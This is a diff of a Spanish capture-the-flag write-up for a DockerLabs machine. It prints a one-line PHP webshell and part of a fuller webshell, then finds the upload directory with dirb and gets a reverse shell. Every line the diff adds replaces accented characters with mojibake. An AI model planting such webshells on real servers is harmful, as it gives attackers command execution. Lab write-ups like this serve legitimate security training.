@@ -3,7 +3,7 @@ Estado: Completado
 Plataforma: DockerLabs
 SO: Linux
 Dificultad: Facil
-VectorInicial: Unrestricted File Upload → RCE
+VectorInicial: Unrestricted File Upload ÔåÆ RCE
 Privesc: sudo env
 Fecha: 2026-02-04
 ---
@@ -19,19 +19,19 @@ Con lo que obtenemos que solo esta abierto el puerto 80:
 
 <img width="853" height="341" alt="Pasted image 20260203194025" src="https://github.com/user-attachments/assets/2f1db8aa-18f6-45ef-a39d-1e5da441b32f" />
 
-Procedemos a ver que hay en dicha dirección desde el navegador
+Procedemos a ver que hay en dicha direcci├│n desde el navegador
 
 <img width="417" height="223" alt="Pasted image 20260203194138" src="https://github.com/user-attachments/assets/d9799e5b-f218-44ff-bdb7-74e62189ae3a" />
 
-Solo hay una opción para subir ficheros, así que probaremos a subir un fichero para obtener una webshell o un basic rce.
+Solo hay una opci├│n para subir ficheros, as├¡ que probaremos a subir un fichero para obtener una webshell o un basic rce.
 
-Para un basi rce podemos usar el siguiente código en un fichero **shell.php**
+Para un basi rce podemos usar el siguiente c├│digo en un fichero **shell.php**
 
 ```php
 <?php system($_GET["cmd"]);?>
 ```
 
-Para un webshell usaremos el siguiente código en un fichero shell.php
+Para un webshell usaremos el siguiente c├│digo en un fichero shell.php
 
 ```php
 <?php
@@ -496,7 +496,7 @@ if (isset($_GET["feature"])) {
                 var shortCwd = cwd;
                 if (cwd.split("/").length > 3) {
                     var splittedCwd = cwd.split("/");
-                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
+                    shortCwd = "ÔÇª/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
                 return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
@@ -647,7 +647,7 @@ El fichero se sube sin problemas pero no indica en la carpeta que se alojo el fi
 
 Ahora tendremos que realizar un descubrimiento de directorios para ver donde esta alojado el fichero.
 
-Con la aplicación de **dirb** ha sido suficiente para encontrar el directorio don se alojan las subidas
+Con la aplicaci├│n de **dirb** ha sido suficiente para encontrar el directorio don se alojan las subidas
 
 ```bash
 dirb http://172.17.0.2
@@ -659,7 +659,7 @@ Ahora nos dirigimos a la url  http://172.17.0.2/uploads para ver si encontramos 
 
 <img width="485" height="220" alt="Pasted image 20260203195418" src="https://github.com/user-attachments/assets/4d56daeb-8199-47bd-83e8-213c17776ff0" />
 
-Y aquí tenemos nuestro fichero, ahora solo tenemos que pulsar en el para obtener una Webshell
+Y aqu├¡ tenemos nuestro fichero, ahora solo tenemos que pulsar en el para obtener una Webshell
 
 <img width="1835" height="841" alt="Pasted image 20260203195511" src="https://github.com/user-attachments/assets/009b3699-1fde-457f-939a-650011583a7f" />
 
@@ -677,7 +677,7 @@ Mientras escuchamos en el puerto 443 desde penelope y obtenemos el acceso a la m
 
 <img width="852" height="488" alt="Pasted image 20260203201019" src="https://github.com/user-attachments/assets/7564e8a4-e609-4bcb-a1d3-1fa09253c4dd" />
 
-# Conclusión
+# Conclusi├│n
 
 Con este CTF vemos como se puede realizar un RFI (Remote File Inclusion) al no encontrase sanitizado el formulario de subida de archivos y los peligros que esto puede conllevar.
 
